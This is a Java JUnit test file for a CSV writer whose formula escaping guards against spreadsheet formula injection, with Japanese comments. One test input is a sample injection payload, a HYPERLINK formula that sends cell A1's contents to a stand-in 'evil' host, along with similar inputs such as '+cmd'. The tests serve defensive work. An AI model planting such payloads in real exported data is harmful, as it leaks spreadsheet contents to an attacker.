package io.jimble.util.csv;

import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;

import java.io.ByteArrayOutputStream;
import java.nio.charset.StandardCharsets;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertTrue;

/**
 * CSV に書く値を、数式として動かさせない（D-227）
 *
 * <p>
 * Excel は {@code = + - @} などで始まるセルを数式として動かすので、利用者が名前に
 * {@code =HYPERLINK(...)} などを入れておくと、管理者が CSV を開いたときに動いた。
 * </p>
 */
class CsvFormulaTest {

	private static String write (boolean escape, Object... values) {

		ByteArrayOutputStream out = new ByteArrayOutputStream();

		try (CsvWriter csv = new CsvWriter(out, "UTF-8")) {
			csv.setEscapeFormula(escape).setLineSeparatorLF().writeLine(values);
		}

		return out.toString(StandardCharsets.UTF_8);

	}

	@Test
	@DisplayName("数式で始まる値の先頭に ' を付ける（全角も）")
	void escapesFormulas () {

		String line = write(true, "=HYPERLINK(\"http://evil/?\"&A1,\"x\")", "+cmd", "@SUM(A1)", "＝１＋１", "\tTAB");

		assertEquals("\"'=HYPERLINK(\"\"http://evil/?\"\"&A1,\"\"x\"\")\",\"'+cmd\",\"'@SUM(A1)\",\"'＝１＋１\",\"'\tTAB\"\n", line);

	}

	@Test
	@DisplayName("数値（負の数を含む）とふつうの文字列はそのまま")
	void keepsNumbers () {

		String line = write(true, -5, "-3.14", "+81", "1e3", "abc", "a=b", "");

		assertEquals("\"-5\",\"-3.14\",\"+81\",\"1e3\",\"abc\",\"a=b\",\"\"\n", line);

	}

	@Test
	@DisplayName("setEscapeFormula(false) なら付けない")
	void optOut () {

		assertEquals("\"=1+1\"\n", write(false, "=1+1"));

	}

	@Test
	@DisplayName("見分け方")
	void looksLikeFormula () {

		assertTrue(CsvWriter.looksLikeFormula("=1"));
		assertTrue(CsvWriter.looksLikeFormula("-cmd"));
		assertTrue(CsvWriter.looksLikeFormula("+81 90-1234-5678"));
		assertFalse(CsvWriter.looksLikeFormula("-10"));
		assertFalse(CsvWriter.looksLikeFormula("名前"));

	}

}
